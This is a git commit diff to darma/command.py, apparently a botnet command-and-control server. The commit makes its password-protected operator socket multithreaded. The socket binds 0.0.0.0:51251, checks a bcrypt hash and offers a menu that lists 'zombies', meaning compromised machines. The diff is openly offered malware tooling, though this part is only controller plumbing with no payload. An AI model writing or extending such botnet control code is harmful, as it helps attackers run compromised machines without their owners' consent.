2b8119023fe6fec4e0781a28fa3e36c9312f3378
root <okmanolos1@hotmail.com>
2020-06-19 01:52:24 -0400

    multithreaded command sockets

--- darma/command.py
+++ darma/command.py
@@ -3,7 +3,7 @@ import socket
 import listener
 import bcrypt
 from prettytable import PrettyTable
-
+import threading
 
 
 def list_zombies(socket):
@@ -36,31 +36,47 @@ Please enter choice: """
 	choice = int(socket.recv(2048).decode('utf-8'))
 	return choice
 
-def start():
-	# bcrypt password hash
-	hash = b'$2b$12$5f2z5D3nmeGV0bVOKmJlXuM0ncQXHu9IokJWe/XZZEVc4cxUV3sZS'
 
+
+# Thread class that handles client connection
+class ClientThread(threading.Thread):
+	def __init__(self,clientsocket,clientAddress):
+        	threading.Thread.__init__(self)
+        	self.clientsocket = clientsocket
+
+	def run(self):
+		# bcrypt password hash
+		hash = b'$2b$12$5f2z5D3nmeGV0bVOKmJlXuM0ncQXHu9IokJWe/XZZEVc4cxUV3sZS'
+		self.clientsocket.send(b'Please enter password: ')
+		password = self.clientsocket.recv(2048)
+		if not bcrypt.checkpw(password, hash):
+			self.clientsocket.close()
+		while self.clientsocket.fileno() != -1:
+			choice = print_menu(self.clientsocket)
+			if choice == 0:
+				list_zombies(self.clientsocket)
+			elif choice == 1:
+				# Exit
+				close_socket(self.clientsocket)
+			else:
+				# Exit
+				close_socket(self.clientsocket)
+
+
+# Parent thread that handles creation of socket 
+def start():
 	# create an INET, STREAMing socket
 	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	# bind the socket to a public host, and a well-known port
-	serversocket.bind((socket.gethostname(), 51251))
+	# unblock socket for reuse
+	serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	# bind the socket
+	serversocket.bind(("0.0.0.0", 51251))
 	# become a server socket
 	serversocket.listen(5)
 	
 	
-
+	# Spawning new thread for each client connection
 	while True:
 		(clientsocket, address) = serversocket.accept()
-		clientsocket.send(b'Please enter password: ')
-		password = clientsocket.recv(2048)
-		if not bcrypt.checkpw(password, hash):
-			clientsocket.close()
-		while clientsocket.fileno() != -1:
-			choice = print_menu(clientsocket)
-			if choice == 0:
-				list_zombies(clientsocket)
-			elif choice == 1:
-				# Exit
-				close_socket(clientsocket)
-			else:
-				close_socket(clientsocket)
+		newthread = ClientThread(clientsocket,address)
+		newthread.start()
